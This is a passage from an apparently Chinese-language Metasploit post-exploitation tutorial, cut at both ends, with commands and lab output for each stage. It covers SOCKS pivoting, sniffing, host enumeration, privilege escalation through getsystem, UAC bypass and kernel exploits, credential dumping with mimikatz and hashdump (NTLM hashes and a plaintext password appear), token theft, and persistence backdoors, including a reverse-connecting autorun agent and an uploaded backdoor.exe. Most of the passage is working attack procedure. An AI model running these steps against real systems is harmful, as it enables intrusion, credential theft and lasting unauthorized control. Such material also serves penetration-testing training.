srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><h3 id="4-4-信息收集-1"><a href="#4-4-信息收集-1" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><h3 id="4-5-提权-1"><a href="#4-5-提权-1" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure><h3 id="4-6-获取凭证-1"><a href="#4-6-获取凭证-1" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>使用meterpreter的run hashdump命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure><h3 id="4-7-假冒令牌-1"><a href="#4-7-假冒令牌-1" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><h3 id="4-8-植入后门-1"><a href="#4-8-植入后门-1" class="headerlink" title="4.8 植入后门"></a>4.8 植入后门</h3>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权，下面就介绍如何植入后门，维持控制。1.persistence启动项后门路径：metasploit/scripts/meterpreter/persistence原理是在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本，在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项，<strong>很容易被杀软拦截，官方不推荐</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444</span><br><span class="line">[*] Persistent agent script is 99630 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs</span><br><span class="line">[+] Agent executed with PID 3540</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua</span><br></pre></td></tr></table></figure>能实现同样功能的脚本还有：exploit/windows/local/persistence2.metsvc服务后门在C:\Users<em><strong>\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。</strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</em>*<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run metsvc –A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    Cannot open service manager (0x00000005)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll</span><br><span class="line">100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul>尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as 